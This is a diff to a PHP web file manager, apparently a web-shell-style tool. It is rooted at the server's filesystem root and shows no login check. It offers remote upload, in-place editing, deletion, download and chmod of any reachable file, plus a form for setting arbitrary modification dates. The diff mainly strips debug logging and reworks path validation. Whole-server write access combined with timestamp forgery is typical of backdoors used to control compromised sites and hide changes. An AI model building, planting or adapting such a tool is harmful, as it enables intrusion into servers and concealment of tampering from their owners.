@@ -14,44 +14,24 @@ if (session_status() === PHP_SESSION_ACTIVE) {
 session_name('filemanager');
 session_start();
 
-// DEBUG MODE - Set to true to see what's happening
-$DEBUG = true;
 
-if ($DEBUG) {
-    error_log("=== FILE MANAGER DEBUG ===");
-    error_log("SCRIPT: " . $_SERVER['SCRIPT_NAME']);
-    error_log("REQUEST URI: " . $_SERVER['REQUEST_URI']);
-    error_log("REQUEST METHOD: " . $_SERVER['REQUEST_METHOD']);
-    error_log("GET: " . print_r($_GET, true));
-    if ($_POST) error_log("POST action: " . ($_POST['action'] ?? 'NONE'));
-}
 
 $ROOT = realpath('/');
 $reqPath = trim((string)($_GET['path'] ?? ''), "/");
 $CURRENT = $reqPath === '' ? $ROOT : realpath($ROOT . '/' . $reqPath);
-
-if ($DEBUG) {
-    error_log("ROOT: $ROOT");
-    error_log("reqPath: $reqPath"); 
-    error_log("CURRENT: " . ($CURRENT ?: 'NOT FOUND'));
-}
-
 if ($CURRENT === false || strpos($CURRENT, $ROOT) !== 0) {
     $CURRENT = $ROOT;
     $reqPath = '';
-    if ($DEBUG) error_log("PATH RESET TO ROOT");
 }
 
 /* ==========================
-   POST HANDLING
+   POST HANDLING (MOVED HERE!)
    ========================== */
    
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     $action = (string)$_POST['action'];
     $targetRel = (string)($_POST['path'] ?? '');
     $targetAbs = fm_safe_target($targetRel);
-
-    if ($DEBUG) error_log("POST ACTION: $action, target: $targetRel");
 
     switch ($action) {
         case 'delete':
@@ -101,54 +81,61 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
             exit;
 
         case 'upload':
-            if ($DEBUG) error_log("UPLOAD STARTED");
-            
-            if (empty($_FILES['upload']['name']) || $_FILES['upload']['error'] !== UPLOAD_ERR_OK) {
-                if ($DEBUG) error_log("UPLOAD ERROR: " . ($_FILES['upload']['error'] ?? 'No file'));
-                header("Location: ?path=" . urlencode($reqPath));
-                exit;
-            }
+    error_log("UPLOAD STARTED");
+    
+    // Check if file was uploaded successfully
+    if (empty($_FILES['upload']['name']) || $_FILES['upload']['error'] !== UPLOAD_ERR_OK) {
+        error_log("UPLOAD ERROR: " . ($_FILES['upload']['error'] ?? 'No file'));
+        header("Location: ?path=" . urlencode($reqPath));
+        exit;
+    }
 
-            $filename = basename($_FILES['upload']['name']);
-            $destRel = ($reqPath ? $reqPath.'/' : '') . $filename;
-            $destAbs = fm_safe_target($destRel, true);
-            
-            if ($DEBUG) error_log("Uploading: $filename to $destAbs");
-            
-            if (!$destAbs) {
-                if ($DEBUG) error_log("UPLOAD BLOCKED: Safe target returned null");
-                header("Location: ?path=" . urlencode($reqPath));
-                exit;
-            }
+    $filename = basename($_FILES['upload']['name']);
+    $destRel = ($reqPath ? $reqPath.'/' : '') . $filename;
+    $destAbs = fm_safe_target($destRel, true);
+    
+    error_log("Uploading: $filename to $destAbs");
+    
+    if (!$destAbs) {
+        error_log("UPLOAD BLOCKED: Safe target returned null");
+        header("Location: ?path=" . urlencode($reqPath));
+        exit;
+    }
 
-            $tempFile = $_FILES['upload']['tmp_name'];
-            
-            if (!file_exists($tempFile)) {
-                if ($DEBUG) error_log("UPLOAD ERROR: Temp file missing");
-                header("Location: ?path=" . urlencode($reqPath));
-                exit;
-            }
+    $tempFile = $_FILES['upload']['tmp_name'];
+    
+    // Verify temp file
+    if (!file_exists($tempFile)) {
+        error_log("UPLOAD ERROR: Temp file missing");
+        header("Location: ?path=" . urlencode($reqPath));
+        exit;
+    }
 
-            $destDir = dirname($destAbs);
-            if (!is_dir($destDir)) {
-                mkdir($destDir, 0755, true);
-            }
+    // Ensure directory exists
+    $destDir = dirname($destAbs);
+    if (!is_dir($destDir)) {
+        mkdir($destDir, 0755, true);
+    }
 
-            if (copy($tempFile, $destAbs)) {
-                if ($DEBUG) error_log("UPLOAD SUCCESS: $destAbs");
-                if (file_exists($destAbs) && filesize($destAbs) > 0) {
-                    if ($DEBUG) error_log("UPLOAD VERIFIED: File exists with size " . filesize($destAbs));
-                } else {
-                    if ($DEBUG) error_log("UPLOAD WARNING: Copy succeeded but file missing or empty");
-                }
-                unlink($tempFile);
-            } else {
-                if ($DEBUG) error_log("UPLOAD FAILED: Copy operation failed");
-            }
+    // Copy with error handling
+    if (copy($tempFile, $destAbs)) {
+        error_log("UPLOAD SUCCESS: $destAbs");
+        // Verify the copy worked
+        if (file_exists($destAbs) && filesize($destAbs) > 0) {
+            error_log("UPLOAD VERIFIED: File exists with size " . filesize($destAbs));
+        } else {
+            error_log("UPLOAD WARNING: Copy succeeded but file missing or empty");
+        }
+        unlink($tempFile);
+    } else {
+        error_log("UPLOAD FAILED: Copy operation failed");
+        error_log("Source readable: " . (is_readable($tempFile) ? 'YES' : 'NO'));
+        error_log("Dest writable: " . (is_writable($destDir) ? 'YES' : 'NO'));
+        error_log("Last error: " . (error_get_last()['message'] ?? 'Unknown'));
+    }
 
-            header("Location: ?path=" . urlencode($reqPath));
-            exit;
-
+    header("Location: ?path=" . urlencode($reqPath));
+    exit;
         case 'download':
             if ($targetAbs && is_file($targetAbs)) {
                 header('Content-Description: File Transfer');
@@ -162,69 +149,43 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
             exit;
 
         case 'save':
-            if ($DEBUG) error_log("=== SAVE ACTION START ===");
-            
-            $fileRel = (string)($_POST['file_path'] ?? '');
-            $targetAbs = fm_safe_target($fileRel);
-            
-            if ($DEBUG) {
-                error_log("Save fileRel: $fileRel");
-                error_log("Save targetAbs: " . ($targetAbs ?: 'NULL'));
-            }
-            
-            if (!$targetAbs) {
-                error_log("SAVE FAILED: Safe target blocked - $fileRel");
-                $saveError = "Security validation failed for path: " . htmlspecialchars($fileRel);
-            } elseif (!is_file($targetAbs)) {
-                error_log("SAVE FAILED: Not a file - $targetAbs");
-                $saveError = "File does not exist: " . htmlspecialchars($fileRel);
-            } else {
-                if ($DEBUG) {
-                    error_log("File exists: " . (file_exists($targetAbs) ? 'YES' : 'NO'));
-                    error_log("Is writable: " . (is_writable($targetAbs) ? 'YES' : 'NO'));
-                }
-                
-                $content = (string)($_POST['content'] ?? '');
-                
-                if ($DEBUG) error_log("Content length to save: " . strlen($content));
-                
-                // Try multiple save methods
-                $success = false;
-                
-                // Method 1: file_put_contents
-                if (@file_put_contents($targetAbs, $content) !== false) {
-                    $success = true;
-                    if ($DEBUG) error_log("SAVE SUCCESS: file_put_contents");
-                } else {
-                    if ($DEBUG) error_log("SAVE FAILED: file_put_contents");
-                    
-                    // Method 2: fopen/fwrite
-                    if ($handle = @fopen($targetAbs, 'wb')) {
-                        if (flock($handle, LOCK_EX)) {
-                            $bytes = fwrite($handle, $content);
-                            fflush($handle);
-                            flock($handle, LOCK_UN);
-                            if ($bytes !== false) {
-                                $success = true;
-                                if ($DEBUG) error_log("SAVE SUCCESS: fwrite - $bytes bytes");
-                            }
-                        }
-                        fclose($handle);
-                    }
-                }
-                
-                if ($success) {
-                    $saveSuccess = "File saved successfully!";
+    $fileRel = (string)($_POST['file_path'] ?? '');
+    $targetAbs = fm_safe_target($fileRel);
+    
+    if (!$targetAbs) {
+        error_log("SAVE FAILED: Safe target blocked - $fileRel");
+        $saveError = "Security validation failed for path: " . htmlspecialchars($fileRel);
+    } elseif (!is_file($targetAbs)) {
+        error_log("SAVE FAILED: Not a file - $targetAbs");
+        $saveError = "File does not exist: " . htmlspecialchars($fileRel);
+    } elseif (!is_writable($targetAbs)) {
+        error_log("SAVE FAILED: Not writable - $targetAbs");
+        $saveError = "File is not writable. Check permissions: " . htmlspecialchars($fileRel);
+    } else {
+        $content = (string)($_POST['content'] ?? '');
+        
+        // Use file locking to prevent race conditions
+        if ($handle = @fopen($targetAbs, 'wb')) {
+            if (flock($handle, LOCK_EX)) {
+                $bytes = fwrite($handle, $content);
+                fflush($handle);
+                flock($handle, LOCK_UN);
+                if ($bytes !== false) {
+                    $saveSuccess = "File saved successfully! (" . $bytes . " bytes written)";
+                    // Update modification time
                     @touch($targetAbs);
-                    if ($DEBUG) error_log("SAVE COMPLETE: File touched");
                 } else {
-                    $saveError = "Failed to save file. Check permissions and disk space.";
-                    if ($DEBUG) error_log("SAVE FAILED: All methods exhausted");
+                    $saveError = "Failed to write content to file.";
                 }
+            } else {
+                $saveError = "Could not lock file for writing (another process may be using it).";
             }
-            
-            if ($DEBUG) error_log("=== SAVE ACTION END ===");
-            break;
+            fclose($handle);
+        } else {
+            $saveError = "Failed to open file for writing. Check file permissions.";
+        }
+    }
+    break;
 
         case 'change_date':
             $newM = (string)($_POST['new_mtime'] ?? '');
@@ -236,6 +197,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
             header("Location: ?path=" . urlencode($parentRel));
             exit;
 
+        // NEW: chmod feature
         case 'chmod':
             $newPerms = (string)($_POST['new_perms'] ?? '');
             if ($targetAbs && preg_match('/^[0-7]{3,4}$/', $newPerms)) {
@@ -246,51 +208,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
             exit;
     }
 }
-
 /* ==========================
    FILE EDIT VIEW
    ========================== */
 if (is_file($CURRENT)) {
-    if ($DEBUG) {
-        error_log("=== FILE EDITOR START ===");
-        error_log("Editing file: $CURRENT");
-        error_log("File exists: " . (file_exists($CURRENT) ? 'YES' : 'NO'));
-        error_log("Is readable: " . (is_readable($CURRENT) ? 'YES' : 'NO'));
-        error_log("Is writable: " . (is_writable($CURRENT) ? 'YES' : 'NO'));
+    // Double-check file accessibility
+    if (!is_readable($CURRENT) || !is_writable($CURRENT)) {
+        header("HTTP/1.0 403 Forbidden");
+        die("File access denied: Check file permissions for " . htmlspecialchars($CURRENT));
     }
     
-    // Try multiple methods to read the file
     $content = @file_get_contents($CURRENT);
     if ($content === false) {
-        // Alternative read method
-        if ($handle = @fopen($CURRENT, 'rb')) {
-            $content = '';
-            while (!feof($handle)) {
-                $content .= fread($handle, 8192);
-            }
-            fclose($handle);
-        }
-    }
-    
-    if ($content === false) {
-        if ($DEBUG) error_log("FAILED TO READ FILE");
         header("HTTP/1.0 500 Internal Server Error");
-        die("Unable to read file. Check permissions: " . htmlspecialchars($CURRENT));
+        die("Unable to read file: " . htmlspecialchars($CURRENT));
     }
     
     $fileRel = $reqPath;
     $parentRel = trim(dirname($fileRel), '/');
-    
-    if ($DEBUG) {
-        error_log("fileRel: $fileRel");
-        error_log("parentRel: $parentRel");
-        error_log("Content length: " . strlen($content));
-        error_log("=== FILE EDITOR END ===");
-    }
-    
     $mtime = @filemtime($CURRENT);
     
-    // Check for save messages
+    // Enhanced save handling
     $saveMessage = '';
     if (!empty($saveSuccess)) {
         $saveMessage = '<div style="background:var(--ok);color:white;padding:10px;border-radius:8px;margin-bottom:16px;">'.$saveSuccess.'</div>';
@@ -327,7 +265,7 @@ if (is_file($CURRENT)) {
                 <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
                 <button class="btn danger" type="submit">Delete</button>
             </form>
-            <form method="post" style="display:inline;">
+            <form method="post" action="" style="display:inline;">
                 <input type="hidden" name="action" value="download">
                 <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
                 <button class="btn gray" type="submit">Download</button>
@@ -350,7 +288,7 @@ if (is_file($CURRENT)) {
                     <input type="hidden" name="action" value="change_date">
                     <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
                     <label>Set Modified Date/Time</label>
-                    <input type="datetime-local" name="new_mtime" value="'.htmlspecialchars($mtime ? date('Y-m-d\TH:i:s', $mtime) : '').'" step="1">
+                    <input type="datetime-local" name="new_mtime" value="'.htmlspecialchars($mtime? date('Y-m-d\TH:i', $mtime) : '').'" step="1">
                     <button class="btn" type="submit" style="margin-left:8px">Update</button>
                 </form>
             </div>
@@ -384,28 +322,62 @@ if (is_file($CURRENT)) {
     exit;
 }
 
-// TEMPORARY: Ultra-permissive safe target for debugging
+
 function fm_safe_target(string $rel, bool $forCreate = false): ?string {
-    global $ROOT, $DEBUG;
-    
-    if ($DEBUG) error_log("fm_safe_target called: rel='$rel', forCreate=" . ($forCreate ? 'true' : 'false'));
+    global $ROOT;
     
     $rel = ltrim($rel, "/");
-    $target = $ROOT . '/' . $rel;
     
-    // ONLY block obvious path traversal
-    if (strpos($rel, '..') !== false) {
-        if ($DEBUG) error_log("BLOCKED: Path traversal detected");
+    // Basic security checks
+    if (strpos($rel, '..') !== false || strpos($rel, "\0") !== false) {
+        error_log("SAFE_TARGET BLOCKED: Path traversal detected - $rel");
         return null;
     }
     
-    if ($DEBUG) error_log("ALLOWED: $target");
-    return $target;
+    $target = $ROOT . '/' . $rel;
+    
+    if ($forCreate) {
+        // For create operations, check if parent directory exists and is within ROOT
+        $parent = dirname($target);
+        
+        // Use realpath on parent only, not on target (which may not exist yet)
+        $parentReal = realpath($parent);
+        if ($parentReal === false) {
+            // Parent doesn't exist, but we might create it
+            // Check if the theoretical parent path is within ROOT
+            if (strpos($parent, $ROOT) === 0) {
+                return $target;
+            }
+            error_log("SAFE_TARGET BLOCKED: Parent outside ROOT - $parent");
+            return null;
+        }
+        
+        if (strpos($parentReal, $ROOT) === 0) {
+            return $target;
+        }
+        error_log("SAFE_TARGET BLOCKED: Parent realpath outside ROOT - $parentReal");
+        return null;
+    }
+    
+    // For existing files, use a more tolerant approach
+    if (file_exists($target)) {
+        $real = realpath($target);
+        if ($real !== false && strpos($real, $ROOT) === 0) {
+            return $real;
+        }
+        error_log("SAFE_TARGET BLOCKED: File exists but realpath failed - $target");
+    } else {
+        error_log("SAFE_TARGET BLOCKED: File doesn't exist - $target");
+    }
+    
+    return null;
 }
+
 
 function fm_perms(string $path): string {
     return substr(sprintf('%o', fileperms($path)), -4);
 }
+
 
 $items = @scandir($CURRENT) ?: [];
 $dirs = $files = [];
@@ -501,6 +473,7 @@ foreach ($listed as $name) {
             <button class="btn small warn" type="submit">Rename</button>
           </form>';
 
+    // NEW: chmod form
     echo '<form method="post">
             <input type="hidden" name="action" value="chmod">
             <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
@@ -516,11 +489,11 @@ foreach ($listed as $name) {
           </form>';
 }
 
-// Date modification form for BOTH files and folders
+// Date modification form for BOTH files and folders (moved outside the if condition)
 echo '<form method="post" style="margin-top:6px">
         <input type="hidden" name="action" value="change_date">
         <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
-        <input type="datetime-local" name="new_mtime" value="'.htmlspecialchars($mtime ? date('Y-m-d\TH:i:s', $mtime) : '').'" step="1">
+        <input type="datetime-local" name="new_mtime" value="'.htmlspecialchars($mtime? date('Y-m-d\TH:i:s', $mtime) : '').'" step="1">
         <button class="btn small" type="submit">Set Date</button>
       </form>';
 
@@ -543,7 +516,7 @@ function fm_delete_dir(string $dir): bool {
 function fm_breadcrumb(string $relPath): string {
     $parts = array_filter(explode('/', $relPath));
     $acc = '';
-    $html = '<div class="breadcrumb"><a href="?path=">ROOT</a>';
+    $html = '<div class="breadcrumb"><a href="?path=">ROOTT</a>';
     foreach ($parts as $p) {
         $acc .= ($acc ? '/' : '') . $p;
         $html .= ' / <a href="?path=' . urlencode($acc) . '">' . htmlspecialchars($p) . '</a>';
